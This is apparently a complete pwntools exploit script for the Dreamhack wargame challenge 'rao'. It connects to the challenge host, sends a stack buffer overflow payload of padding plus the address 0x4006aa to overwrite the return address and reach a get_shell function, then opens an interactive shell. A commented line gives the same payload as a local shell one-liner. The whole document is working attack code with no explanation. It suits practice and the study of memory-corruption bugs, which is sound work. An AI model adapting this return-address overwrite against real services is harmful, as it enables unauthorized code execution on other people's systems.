from pwn import *

p = remote('host3.dreamhack.games', '18893')

get_shell = 0x4006aa

payload = 'A' * 0x30
payload += 'B' * 0x8
payload += '\xaa\x06\x40\x00\x00\x00\x00\x00'
# payload = b'A'*0x30+b'B'*0x8+p64(0x4006aa)
#(python -c "import sys;sys.stdout.buffer.write(b'A'*0x30 + b'B'*0x8 + b'\xaa\x06\x40\x00\x00\x00\x00\x00')";cat)| ./rao

p.recvuntil('Input: ')
p.sendline(payload)
p.interactive()

